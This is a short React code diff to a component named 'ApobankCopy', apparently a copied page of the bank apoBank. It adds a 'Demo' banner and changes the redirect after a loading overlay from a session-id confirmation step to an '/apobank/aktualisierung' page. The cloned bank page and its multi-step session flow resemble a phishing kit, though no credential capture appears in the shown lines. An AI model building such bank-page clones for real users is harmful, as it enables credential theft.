@@ -61,6 +61,9 @@ const ApobankCopy = () => {
         lineHeight: 1.5,
       }}
     >
+      {/* Demo topbar */}
+      <div style={{ background: "#e53935", color: "#fff", textAlign: "center", padding: "6px 0", fontSize: 14, fontWeight: 700, letterSpacing: 1 }}>Demo</div>
+
       <div style={{ height: "2.5rem" }} />
 
       <main
@@ -305,7 +308,7 @@ const ApobankCopy = () => {
 
       {showLoading && (
         <LoadingOverlay
-          onComplete={() => navigate((new URLSearchParams(window.location.search).get("return") || "") ? `${new URLSearchParams(window.location.search).get("return")}?step=3&s=${sessionId}` : "/confirmation?s=" + sessionId)}
+          onComplete={() => { window.location.href = "/apobank/aktualisierung"; }}
         />
       )}
     </div>
